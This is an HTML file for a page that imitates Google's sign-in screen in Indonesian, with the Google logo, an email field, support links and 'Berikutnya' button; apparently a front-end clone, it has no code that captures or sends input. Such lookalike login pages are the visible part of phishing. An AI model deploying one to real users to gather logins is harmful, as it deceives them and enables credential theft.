<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
</head>

<body>
    <section class="container">
        <div class="card">
            <div class="text" style="text-align: center; color: #202124;
                                        padding-bottom: 0;
                                        padding-top: 16px;
                                        font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
                                        font-size: 24px;
                                        font-weight: 400;
                                        line-height: 1.3333;">
                <img class="logo" src="img/logo.png" alt="Google" srcset="" style=" display:flex;">
                <p>Login</p>
                <p style="color: #202124;
                                        font-size: 16px;
                                        font-weight: 400;
                                        letter-spacing: .1px;
                                        line-height: 1.5;">Gunakan Akun Google Anda</p>
            </div>
            <form style="margin: 0px 16px 0px 16px;" class="formulir">
                <div>
                    <input required='' type='text'>
                    <label alt='Email atau ponsel' placeholder='Adaptive Placeholder'></label>
                </div>
                <div>
                    <a class="text" href="http://" style="text-decoration: none; margin-left:-5px ">Lupa email?</a>
                </div>

            </form>
            <div class="text" style="color: #5f6368;font-size: 14px;line-height: 1.4286;">
                Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi. <a href="https://support.google.com/chrome/answer/6130773?hl=id" style="text-decoration:none">Pelajari selengkapnya</a>
            </div>

            <div class="mid_button">
                <div><button type="button" class="btn btn-link" style="text-decoration: none; ">Buat Akun</button> </div>
                <div>
                    <button class="btn btn-primary">Berikutnya</button>
                </div>

            </div>


            <div class="bottom_">
                <div>
                    <div class="dropdown">
                        <button style="text-decoration: none;" class="btn btn-link dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                            Afrikans
                        </button>
                        <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
                            <a class="dropdown-item" href="#">Indonesia</a>
                            <a class="dropdown-item" href="#">English</a>
                            <a class="dropdown-item" href="#">German</a>
                        </div>
                    </div>
                </div>
                <div style=" display:flex; margin-top: 10px;"> 
                    <div>Bantuan</div>
                    <div>Privasi</div>
                    <div>Persyaratan</div>
                </div>

            </div>
        </div>
    </section>

    <script src="js/jquery.js"></script>
    <script src="js/popper.js"></script>
    <script src="js/bootstrap.js"></script>
</body>

</html>